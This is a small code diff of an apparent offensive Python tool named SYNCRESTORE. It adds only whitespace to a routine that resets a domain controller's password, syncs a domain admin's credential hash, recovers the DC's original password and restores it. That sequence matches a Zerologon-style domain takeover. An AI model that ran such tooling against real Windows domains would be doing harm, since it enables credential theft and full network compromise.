@@ -129,13 +129,17 @@ class SYNCRESTORE:
         print("[*] Searching for DC...")
         reset = self.reset_dc_password()
         
+        
         if reset:
             print(f"[*] Searching for target domain admin...")
             self.domain_admin_hash = self.sync_da_creds()
         
+
+        
         if self.domain_admin_hash:
             print("[*] Trying to get DC hex password...")
             self.hex_password = self.sync_dc_hexpass()
+        
         
         if self.hex_password:
             self.reset_dc_password(restore=True)
